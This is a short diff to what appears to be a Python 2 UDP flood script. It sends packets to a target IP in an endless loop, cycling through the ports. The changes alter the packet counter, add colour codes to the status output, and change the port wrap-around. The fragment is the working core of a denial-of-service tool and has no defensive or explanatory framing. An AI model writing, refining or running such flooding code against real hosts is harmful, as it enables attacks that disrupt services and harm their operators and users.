@@ -59,11 +59,11 @@ print "Waiting..."
 time.sleep(5)
 print "\033[1;37m"
 print "\033[92m"
-sent = 100
+sent = 1
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 2
      port = port + 2
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent \033[1;37m%s \033[92mpacket to \033[1;37m%s \033[92mthrought port:\033[1;37m%s"%(sent,ip,port)
      if port == 65534:
-       port = 1
+       port = 0
